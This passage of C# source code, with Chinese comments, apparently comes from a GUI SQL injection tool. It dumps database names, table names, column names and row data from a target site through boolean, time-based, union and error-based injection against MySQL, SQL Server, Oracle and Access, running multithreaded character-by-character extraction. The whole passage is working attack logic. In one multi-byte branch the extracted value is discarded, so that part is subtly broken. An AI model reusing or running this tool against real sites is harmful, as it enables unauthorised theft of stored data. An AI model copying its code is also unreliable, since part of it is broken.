                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbname;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getTableNameValueByBoolByMySQL), sn);
                    }
                    break;
                case DBType.SQLServer:
                    table_count = getValueByStepUp(MSSQL.bool_tables_count.Replace("{dbname}", dbname), 0, 50);
                    this.Invoke(new StringDelegate(log), "报告大侠，数据库" + dbname + "发现" + table_count + "个表！");
                    for (int i = 0; i < table_count; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbname;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getTableNameValueByBoolBySQLServer), sn);
                    }
                    break;
                case DBType.Oracle:
                    //获取当前数据库长度
                    table_count = getValueByStepUp(Oracle.bool_tables_count.Replace("{dbname}", dbname), 0, 50);
                    this.Invoke(new StringDelegate(log), "报告大侠，数据库" + dbname + "发现" + table_count + "个表！");
                    for (int i = 1; i <= table_count; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbname;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getTableNameValueByBoolByOracle), sn);
                    }
                    break;
            }

        }
        /// <summary>
        /// union方式获取表名
        /// </summary>
        public void getTabeleNameByUnion(DBType dbType, TreeNode tn)
        {
            String dbName = tn.Text;
            List<String> data_list = new List<String>();
            String tables_count_payload = "";
            String result = "";
            int table_count = 0;
            switch (dbType)
            {

                case DBType.Access:
                    if (String.IsNullOrEmpty(config.key))
                    {
                        MessageBox.Show(ErrorMessage.access_no_key);
                        return;
                    }
                    checkTablesDic(tn);
                    break;
                case DBType.MySQL4:

                    break;
                case DBType.MySQL5:
                    //获取当前数据库表数量
                    data_list.Add(MySQL5.tables_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")));
                    tables_count_payload = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, "1", data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", tables_count_payload));

                    this.Invoke(new StringDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！");
                    table_count = Tools.convertToInt(result);
                    this.tableCount = table_count;
                    for (int i = 0; i < table_count; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getTableNameValueByUnionByMySQL), sn);
                    }
                    break;
                case DBType.SQLServer:
                    //获取当前数据库表数量
                    tables_count_payload = MSSQL.getUnionDataValue(config.columnsCount, config.showColumn, 1, MSSQL.tables_count, dbName, "", "");
                    result = getOneDataByUnionOrError(tables_count_payload);

                    this.Invoke(new StringDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！");
                    table_count = Tools.convertToInt(result);
                    this.tableCount = table_count;
                    for (int i = 0; i < table_count; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getTableNameValueByUnionBySQLServer), sn);
                    }
                    break;
                case DBType.Oracle:
                    //获取当前数据库表数量
                    tables_count_payload = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.tables_count, dbName, "", "");
                    result = getOneDataByUnionOrError(tables_count_payload);

                    this.Invoke(new StringDelegate(log), "报告大侠，用户" + dbName + "有" + Tools.convertToInt(result) + "个表！");
                    table_count = Tools.convertToInt(result);
                    this.tableCount = table_count;
                    //下标1开始
                    for (int i = 1; i <= table_count; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getTableNameValueByUnionByOracle), sn);
                    }
                    break;
            }
        }

        /// <summary>
        /// Error方式获取
        /// </summary>
        public void getTabeleNameByError(DBType dbType, TreeNode tn)
        {
            //获取数据库数量
            String dbName = tn.Text;
            List<String> data_list = new List<String>();
            String tables_count_payload = "";
            String result = "";
            int table_count = 0;
            switch (dbType)
            {
                case DBType.Access:
                    MessageBox.Show("抱歉Access数据库不支持错误显示注入！");
                    break;
                case DBType.MySQL4:
                    MessageBox.Show("抱歉MySQL4数据库，不支持错误显示注入！");
                    break;
                case DBType.MySQL5:
                    //获取当前数据库表长度
                    data_list.Add(MySQL5.tables_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")));
                    tables_count_payload = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", tables_count_payload));

                    this.Invoke(new StringDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！");
                    table_count = Tools.convertToInt(result);
                    this.tableCount = table_count;
                    for (int i = 0; i < table_count; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getTableNameValueByErrorByMySQL), sn);
                    }
                    break;
                case DBType.SQLServer:
                    //获取当前数据库表长度
                    result = getOneDataByUnionOrError(MSSQL.error_value.Replace("{data}", MSSQL.tables_count.Replace("{dbname}", dbName)));
                    //HTML解码
                    result = HttpUtility.HtmlDecode(result);
                    this.Invoke(new StringDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！");
                    table_count = Tools.convertToInt(result);
                    this.tableCount = table_count;
                    for (int i = 0; i < table_count; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getTableNameValueByErrorBySQLServer), sn);
                    }
                    break;
                case DBType.Oracle:
                    //获取当前数据库表长度
                    result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.tables_count, dbName, "", ""));

                    this.Invoke(new StringDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！");
                    table_count = Tools.convertToInt(result);
                    this.tableCount = table_count;
                    for (int i = 1; i <= table_count; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        MyThreadPool.initThread(new ParameterizedThreadStart(getTableNameValueByErrorByOracle), sn);
                    }
                    break;
            }
        }

        /// <summary>
        /// 获取数据库列表
        /// </summary>
        public void getDBS()
        {

            switch (config.injectType)
            {
                case InjectType.Bool:
                    getDBSByBool(config.dbType);
                    break;

                case InjectType.Union:
                    getDBSByUnion(config.dbType);
                    break;
                case InjectType.Error:
                    getDBSByError(config.dbType);
                    break;
                case InjectType.Sleep:
                    getDBSByBool(config.dbType);
                    break;

            }
        }
        private void data_dbs_tsl_getDBS_Click(object sender, EventArgs e)
        {
            if (MyThreadPool.GetAliveThreadsCount() == 0)
            {
                //获取环境变量
                this.data_tvw_dbs.Nodes.Clear();
                if (this.cbox_basic_dbType.Text.Equals("Access"))
                {
                    addDBToTreeList("Access");
                }
                //检查注入配置
                if (checkConfig())
                {
                    //判断是否标记注入点
                    if (isSetInjectPoint())
                    {
                        status = 1;
                        this.currentThread = new Thread(getDBS);
                        this.currentThread.Start();
                    }

                }
            }
            else
            {

                MessageBox.Show("还有线程未结束，请稍后....");

            }

        }

        /// <summary>
        /// 获取当前数据库下的表
        /// </summary>
        /// <param name="otn">当前数据库的TreeNode节点</param>
        public void getTables(Object otn)
        {
            if (checkConfig())
            {
                if (isSetInjectPoint())
                {
                    switch (config.injectType)
                    {
                        case InjectType.Bool:
                            getTabeleNameByBool(config.dbType, (TreeNode)otn);
                            break;
                        case InjectType.Union:
                            getTabeleNameByUnion(config.dbType, (TreeNode)otn);
                            break;
                        case InjectType.Error:
                            getTabeleNameByError(config.dbType, (TreeNode)otn);
                            break;
                        case InjectType.Sleep:
                            getDBSByBool(config.dbType);
                            break;
                    }
                }
                else
                {
                    MessageBox.Show("请标记注入点！");
                }
            }
            else
            {
                MessageBox.Show("配置不完整，请检注入查配置！");
            }
        }

        private void data_dbs_tsl_getTables_Click(object sender, EventArgs e)
        {
            foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
            {
                if (tn.Checked && "dbs".Equals(tn.Tag))
                {
                    if (MyThreadPool.GetAliveThreadsCount() == 0)
                    {
                        tn.Nodes.Clear();
                        status = 1;
                        this.currentThread = new Thread(new ParameterizedThreadStart(getTables));
                        this.currentThread.Start(tn);
                    }
                    else
                    {
                        MessageBox.Show("还有线程未结束，请稍后....");
                    }
                }
            }
        }

        /// <summary>
        /// 获取列明称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolByMySQL(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前表长度
                String data_payload = MySQL5.column_value.Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")).Replace("{index}", sn.limit + "").Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8"));
                int len = 0;
                if (KeyType.Time.Equals(config.keyType))
                {
                    len = getValue(MySQL5.getBoolCountBySleep(MySQL5.bool_length.Replace("{data}", data_payload), config.maxTime), 1, 50);
                }
                else
                {

                    len = getValue(MySQL5.ver_length.Replace("{data}", data_payload), 1, 50);
                }

                //判断当前数据库对应的ascii码
                String va_payload = MySQL5.ver_value.Replace("{data}", data_payload);
                if (KeyType.Time.Equals(config.keyType))
                {
                    va_payload = MySQL5.getBoolCountBySleep(MySQL5.bool_value.Replace("{data}", data_payload), config.maxTime);
                }
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                }
                this.Invoke(new StringDelegate(log), "表" + sn.tableName + "发现列：" + value);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, value, "column");

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取列名称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolBySQLServer(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                String data_payload = MSSQL.column_value.Replace("{index}", sn.limit.ToString()).Replace("{dbname}", sn.dbname).Replace("{table}", sn.tableName);
                int len = getValueByStepUp(MSSQL.bool_length.Replace("{data}", data_payload), 0, 10);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = MSSQL.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                    //取unicode转换后的长度
                    String unicode_data_len_payload = MSSQL.bool_length.Replace("{data}", unicode_data_payload);

                    //长度范围2-8支持大部分语言
                    int unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
                    int m_index = 1;
                    StringBuilder unicodes = new StringBuilder();
                    while (m_index <= unicode_data_len)
                    {
                        //获取多字节
                        String substr_payload = MSSQL.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                        //单个unicode值范围是0-9
                        int unicode = getValue(MSSQL.bool_value.Replace("{data}", substr_payload), 0, 9);
                        unicodes.Append(unicode.ToString());
                        m_index++;
                    }

                    if (Tools.convertToInt(unicodes.ToString()) > 255)
                    {
                        value += Tools.unHexByUnicode(int.Parse(unicodes.ToString()), config.db_encoding);
                    }
                    else
                    {
                        value += (char)Tools.convertToInt(unicodes.ToString());
                    }
                }
                this.Invoke(new StringDelegate(log), "表" + sn.tableName + "发现列：" + value);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, value, "column");

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }


        /// <summary>
        /// 获取列明称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolByOracle(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前表长度
                String data_payload = Oracle.column_value.Replace("{table}", sn.tableName).Replace("{index}", sn.limit + "").Replace("{dbname}", sn.dbname);
                int len = getValue(Oracle.bool_length.Replace("{data}", data_payload), 1, 50);

                //判断当前数据库对应的ascii码
                String va_payload = Oracle.bool_value.Replace("{data}", data_payload);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                }
                this.Invoke(new StringDelegate(log), "表" + sn.tableName + "发现列：" + value);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, value, "column");

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取列名，union MySQL
        /// </summary>
        /// <param name="osn"></param>
        public void getColumnNameByUnionByMySQL(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                //获取数据库数量
                List<String> data_list = new List<String>();
                data_list.Add(MySQL5.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")));
                String column_Name_data = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, "1", data_list, null, null, -1);
                String result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", column_Name_data));
                this.Invoke(new StringDelegate(log), "发现列：" + result);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取列名，union MySQL
        /// </summary>
        /// <param name="osn"></param>
        public void getColumnNameByUnionBySQLServer(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;

                String column_Name_data = MSSQL.getUnionDataValue(config.columnsCount, config.showColumn, 1, MSSQL.column_value, sn.dbname, sn.tableName, sn.limit.ToString());
                String result = getOneDataByUnionOrError(column_Name_data);
                this.Invoke(new StringDelegate(log), "发现列：" + result);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }


        /// <summary>
        /// 获取列名，union oracle
        /// </summary>
        /// <param name="osn"></param>
        public void getColumnNameByUnionByOracle(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;

                String column_Name_data = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.column_value, sn.dbname, sn.tableName, sn.limit.ToString());
                String result = getOneDataByUnionOrError(column_Name_data);
                this.Invoke(new StringDelegate(log), "发现列：" + result);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取列名时发生异常：" + e.Message);
            }
        }


        public void getColumnNameByErrorByMySQL(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                //获取数据库数量
                List<String> data_list = new List<String>();
                data_list.Add(MySQL5.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")));
                String column_Name_data = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
                String result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", column_Name_data));
                this.Invoke(new StringDelegate(log), "发现列：" + result);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }

        public void getColumnNameByErrorBySQLServer(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                String result = getOneDataByUnionOrError(MSSQL.error_value.Replace("{data}", MSSQL.column_value.Replace("{index}", sn.limit.ToString()).Replace("{dbname}", sn.dbname).Replace("{table}", sn.tableName)));
                this.Invoke(new StringDelegate(log), "发现列：" + result);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }

        public void getColumnNameByErrorByOracle(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                String result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.column_value, sn.dbname, sn.tableName, sn.limit.ToString()));
                this.Invoke(new StringDelegate(log), "发现列：" + result);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// 获取表下面的列
        /// </summary>
        /// <param name="dbType">数据库类型</param>
        public void getColumnsByBool(DBType dbType)
        {

            foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
            {
                foreach (TreeNode ctn in tn.Nodes)
                {
                    if (ctn.Checked && "table".Equals(ctn.Tag))
                    {
                        ctn.Nodes.Clear();

                        String dbName = ctn.Parent.Text;
                        String tableName = ctn.Text;
                        int columns_count = 0;
                        switch (dbType)
                        {

                            case DBType.Access:
                                checkColumnsDic(ctn);
                                break;
                            case DBType.MySQL4:

                                break;
                            case DBType.MySQL5:

                                if (KeyType.Time.Equals(config.keyType))
                                {
                                    columns_count = getValueByStepUp(MySQL5.getBoolCountBySleep(MySQL5.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")), config.maxTime), 0, 20);
                                }
                                else
                                {
                                    columns_count = getValueByStepUp(MySQL5.bool_columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")), 0, 20);
                                }

                                this.Invoke(new StringDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！");
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    MyThreadPool.initThread(new ParameterizedThreadStart(getColumnNameByBoolByMySQL), sn);
                                }
                                break;
                            case DBType.SQLServer:
                                columns_count = getValueByStepUp(MSSQL.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName), 0, 20);
                                this.Invoke(new StringDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！");
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    MyThreadPool.initThread(new ParameterizedThreadStart(getColumnNameByBoolBySQLServer), sn);
                                }
                                break;
                            case DBType.Oracle:
                                columns_count = getValueByStepUp(Oracle.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName), 0, 20);
                                this.Invoke(new StringDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！");
                                for (int i = 1; i <= columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    MyThreadPool.initThread(new ParameterizedThreadStart(getColumnNameByBoolByOracle), sn);
                                }
                                break;
                        }

                    }
                }
            }

        }

        /// <summary>
        /// 获取表下面的列
        /// </summary>
        /// <param name="dbType">数据库类型</param>
        public void getColumnsByUnion(DBType dbType)
        {

            foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
            {
                foreach (TreeNode ctn in tn.Nodes)
                {
                    if (ctn.Checked && "table".Equals(ctn.Tag))
                    {
                        ctn.Nodes.Clear();
                        String dbName = ctn.Parent.Text;
                        String tableName = ctn.Text;
                        List<String> data_list = new List<String>();
                        String columns_count_payload = "";
                        String result = "";
                        int columns_count = 0;
                        switch (dbType)
                        {

                            case DBType.Access:
                                checkColumnsDic(ctn);
                                break;
                            case DBType.MySQL4:

                                break;
                            case DBType.MySQL5:
                                data_list.Add(MySQL5.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")));
                                columns_count_payload = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, "1", data_list, null, null, -1);
                                result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", columns_count_payload));

                                this.Invoke(new StringDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！");
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    MyThreadPool.initThread(new ParameterizedThreadStart(getColumnNameByUnionByMySQL), sn);
                                }
                                break;
                            case DBType.SQLServer:
                                columns_count_payload = MSSQL.getUnionDataValue(config.columnsCount, config.showColumn, 1, MSSQL.columns_count, dbName, tableName, "");
                                result = getOneDataByUnionOrError(columns_count_payload);

                                this.Invoke(new StringDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！");
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    MyThreadPool.initThread(new ParameterizedThreadStart(getColumnNameByUnionBySQLServer), sn);
                                }
                                break;
                            case DBType.Oracle:
                                columns_count_payload = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.columns_count, dbName, tableName, "");
                                result = getOneDataByUnionOrError(columns_count_payload);

                                this.Invoke(new StringDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！");
                                columns_count = Tools.convertToInt(result);
                                for (int i = 1; i <= columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    MyThreadPool.initThread(new ParameterizedThreadStart(getColumnNameByUnionByOracle), sn);
                                }
                                break;
                        }

                    }
                }
            }

        }


        /// <summary>
        /// 获取表下面的列
        /// </summary>
        /// <param name="dbType">数据库类型</param>
        public void getColumnsByError(DBType dbType)
        {
            foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
            {
                foreach (TreeNode ctn in tn.Nodes)
                {
                    if (ctn.Checked && "table".Equals(ctn.Tag))
                    {
                        ctn.Nodes.Clear();
                        String dbName = ctn.Parent.Text;
                        String tableName = ctn.Text;
                        List<String> data_list = new List<String>();
                        String columns_count_payload = "";
                        String result = "";
                        int columns_count = 0;
                        switch (dbType)
                        {
                            case DBType.Access:
                                MessageBox.Show("抱歉Access数据库，不支持错误显示注入！");
                                break;
                            case DBType.MySQL4:
                                MessageBox.Show("抱歉MySQL4数据库，不支持错误显示注入！");
                                break;
                            case DBType.MySQL5:

                                data_list.Add(MySQL5.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")));
                                columns_count_payload = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
                                result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", columns_count_payload));

                                this.Invoke(new StringDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！");
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    MyThreadPool.initThread(new ParameterizedThreadStart(getColumnNameByErrorByMySQL), sn);
                                }
                                break;
                            case DBType.SQLServer:
                                result = getOneDataByUnionOrError(MSSQL.error_value.Replace("{data}", MSSQL.columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName)));
                                //HTML解码
                                result = HttpUtility.HtmlDecode(result);
                                this.Invoke(new StringDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！");
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    MyThreadPool.initThread(new ParameterizedThreadStart(getColumnNameByErrorBySQLServer), sn);
                                }
                                break;
                            case DBType.Oracle:
                                result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.columns_count, dbName, tableName, ""));

                                this.Invoke(new StringDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！");
                                columns_count = Tools.convertToInt(result);
                                for (int i = 1; i <= columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    MyThreadPool.initThread(new ParameterizedThreadStart(getColumnNameByErrorByOracle), sn);
                                }
                                break;
                        }

                    }
                }
            }

        }
        private void getColumns()
        {
            if (checkConfig())
            {
                if (isSetInjectPoint())
                {
                    switch (config.injectType)
                    {
                        case InjectType.Bool:
                            getColumnsByBool(config.dbType);
                            break;
                        case InjectType.Union:
                            getColumnsByUnion(config.dbType);
                            break;
                        case InjectType.Error:
                            getColumnsByError(config.dbType);
                            break;
                        case InjectType.Sleep:
                            getDBSByBool(config.dbType);
                            break;

                    }
                }
                else
                {
                    MessageBox.Show("未标记注入点，请标记！");
                }
            }
            else
            {
                MessageBox.Show("注入配置错误，请检查！");
            }
        }
        private void data_dbs_tsl_getColumns_Click(object sender, EventArgs e)
        {

            if (MyThreadPool.GetAliveThreadsCount() == 0)
            {
                status = 1;
                this.currentThread = new Thread(getColumns);
                this.currentThread.Start();
            }
            else
            {

                MessageBox.Show("还有线程未结束，请稍候....");
            }

        }

        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolByMySQL(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                String data_payload = MySQL5.data_value.Replace("{dbname}", gp.dbname).Replace("{table}", gp.table).Replace("{limit}", gp.limit + "");

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值

                    String payload_len = MySQL5.ver_length.Replace("{data}", data_payload).Replace("{columns}", columnName);

                    if (config.keyType.Equals(KeyType.Time))
                    {
                        payload_len = MySQL5.getBoolCountBySleep(MySQL5.bool_length.Replace("{data}", data_payload).Replace("{columns}", columnName), config.maxTime);
                    }
                    int len = getValueByStepUp(payload_len, 0, 50);


                    String va_payload = MySQL5.ver_value.Replace("{data}", data_payload).Replace("{columns}", columnName);
                    String value = "";
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        String tmp_va_payload = MySQL5.mu_value.Replace("{data}", data_payload).Replace("{index}", i + "").Replace("{columns}", columnName);
                        String plen = "";
                        //是否判断多字节字符
                        Boolean pLen_isMax = false;
                        if (config.isMuStr)
                        {
                            //开启多字节判断
                            //转换对应值判断是否多字节字符
                            plen = MySQL5.ver_length.Replace("{data}", tmp_va_payload);
                            if (config.keyType.Equals(KeyType.Time))
                            {
                                plen = MySQL5.getBoolCountBySleep(MySQL5.bool_length.Replace("{data}", tmp_va_payload), config.maxTime);
                            }
                            pLen_isMax = findKeyInBody(plen, 2);
                        }

                        //取值payload，替换对应下标值

                        //多字节字符
                        if (pLen_isMax)
                        {
                            //MySQL采用hex
                            int mu_payload_len = getValue(plen, 2, 8);
                            int m_index = 1;
                            String[] ver_tmp = new String[mu_payload_len];
                            while (m_index <= mu_payload_len)
                            {
                                //获取多字节
                                int ascii = 0;
                                if (config.keyType.Equals(KeyType.Time))
                                {
                                    getValue(MySQL5.getBoolCountBySleep(MySQL5.bool_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index + ""), config.maxTime), 0, 128);
                                }
                                else
                                {
                                    getValue(MySQL5.ver_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index + ""), 0, 128);
                                }
                                ver_tmp[m_index - 1] = ((char)ascii).ToString();
                                m_index++;
                            }
                            //设置值,这里由于是hex值，需要转换
                            value += Tools.unHex(Tools.convertToString(ver_tmp), config.db_encoding);
                        }
                        //单字节字符
                        else
                        {
                            String payload = MySQL5.ver_value.Replace("{data}", data_payload).Replace("{columns}", columnName).Replace("{index}", i + "");
                            if (config.keyType.Equals(KeyType.Time))
                            {
                                payload = MySQL5.getBoolCountBySleep(MySQL5.bool_value.Replace("{data}", data_payload).Replace("{columns}", columnName).Replace("{index}", i + ""), config.maxTime);
                            }

                            int ascii = getValue(payload, 0, 255);

                            value += ((char)ascii).ToString();
                        }
                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(value);
                    }
                    else
                    {
                        lvi.SubItems.Add(value);
                    }

                }
                this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.Invoke(new StringDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！");

